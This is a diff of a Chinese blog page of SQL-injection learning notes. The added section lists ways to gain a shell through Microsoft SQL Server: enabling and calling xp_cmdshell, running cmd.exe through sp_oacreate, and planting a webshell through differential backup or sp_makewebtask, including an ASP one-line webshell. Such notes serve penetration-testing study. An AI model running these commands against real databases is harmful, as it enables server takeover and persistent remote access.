@@ -24,7 +24,7 @@
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://yoursite.com/2019/08/29/sql注入获得shell/1567151247852.png">
 <meta property="og:image" content="http://yoursite.com/2019/08/29/sql注入获得shell/1567151261135.png">
-<meta property="og:updated_time" content="2019-08-30T09:33:43.947Z">
+<meta property="og:updated_time" content="2019-09-02T09:19:15.748Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql注入获得shell">
 <meta name="twitter:description" content="前言最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。 当然作为新手我总结的方式肯定不全面在以后的学习工作中我遇到新的方式会添加进来。 MySql权限mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。 表权限:’Select’, ‘Insert’, ‘Update’, ‘">
@@ -187,7 +187,7 @@ ga('send', 'pageview');
 
   <div id="toc" class="toc-article">
     <strong class="toc-title">Posts List</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySql"><span class="toc-text">MySql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#权限"><span class="toc-text">权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell方法总结"><span class="toc-text">getshell方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#select-…-into-outfile方法"><span class="toc-text">select … into outfile方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#日志获得shell"><span class="toc-text">日志获得shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御方法"><span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SqlServer"><span class="toc-text">SqlServer</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySql"><span class="toc-text">MySql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#权限"><span class="toc-text">权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell方法总结"><span class="toc-text">getshell方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#select-…-into-outfile方法"><span class="toc-text">select … into outfile方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#日志获得shell"><span class="toc-text">日志获得shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御方法"><span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SqlServer"><span class="toc-text">SqlServer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell方式总结"><span class="toc-text">getshell方式总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-cmdshell"><span class="toc-text">xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SP-OACREATE"><span class="toc-text">SP_OACREATE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#差异备份"><span class="toc-text">差异备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sp-makewebtask备份"><span class="toc-text">sp_makewebtask备份</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#oracle"><span class="toc-text">oracle</span></a></li></ol>
   </div>
 
 
@@ -265,7 +265,26 @@ ga('send', 'pageview');
 <p><strong>mysql中慢查询日志也可以使用此方法来写入shell，错误日志与二进制日志目录都是需要修改mysql配置文件实现意义较低</strong></p>
 <h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>secure_file_prive = null。</p>
 <p>正确设置 web 目录权限，除 log、upload 等目录外不授予写权限，upload 目录不授予执行权限。</p>
-<h1 id="SqlServer"><a href="#SqlServer" class="headerlink" title="SqlServer"></a>SqlServer</h1><p>····未完待续</p>
+<h1 id="SqlServer"><a href="#SqlServer" class="headerlink" title="SqlServer"></a>SqlServer</h1><h2 id="getshell方式总结"><a href="#getshell方式总结" class="headerlink" title="getshell方式总结"></a>getshell方式总结</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p>xp_cmdshell是mssql的存储过程，可以直接执行命令。</p>
+<p><code>EXEC master.dbo.xp_cmdshell &#39;cmd&#39;;</code></p>
+<p>mssql2005版本默认禁止。</p>
+<p>激活xp_cmdshell。</p>
+<p><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</code></p>
+<p>安装xp_cmdshell。</p>
+<p><code>EXEC sp_addextendedproc xp_cmdshell,@dllname =&#39;xplog70.dll&#39;declare @o int</code></p>
+<p><code>sp_addextendedproc &#39;xp_cmdshell&#39;,&#39;xpsql70.dll&#39;</code></p>
+<h3 id="SP-OACREATE"><a href="#SP-OACREATE" class="headerlink" title="SP_OACREATE"></a>SP_OACREATE</h3><p>写入shell</p>
+<p><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;d:\\temp\\1.txt&#39;</code></p>
+<p>激活sp_oacreate。</p>
+<p><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ole Automation Procedures&#39;,1;RECONFIGURE;</code></p>
+<h3 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a>差异备份</h3><p><code>backup database 库名 to disk = &#39;路径&#39;;
+create table [dbo].[test_tmp] ([cmd] [image]);
+insert into  test_tmp(cmd) values(&#39;webshell&#39;);
+backup database 库名 to disk=&#39;路径&#39; WITH DIFFERENTIAL,FORMAT;</code></p>
+<h3 id="sp-makewebtask备份"><a href="#sp-makewebtask备份" class="headerlink" title="sp_makewebtask备份"></a>sp_makewebtask备份</h3><p><code>exec sp_makewebtask &#39;c:\shell.asp&#39;,&#39; select &#39;&#39;&lt;%25execute(request(&quot;a&quot;))%25&gt;&#39;&#39; &#39;;</code></p>
+<p>默认2005禁止，激活存储过程。</p>
+<p><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Web Assistant Procedures&#39;,1;RECONFIGURE;</code></p>
+<h1 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h1><p>···未完待续。</p>
 
     
   </div>
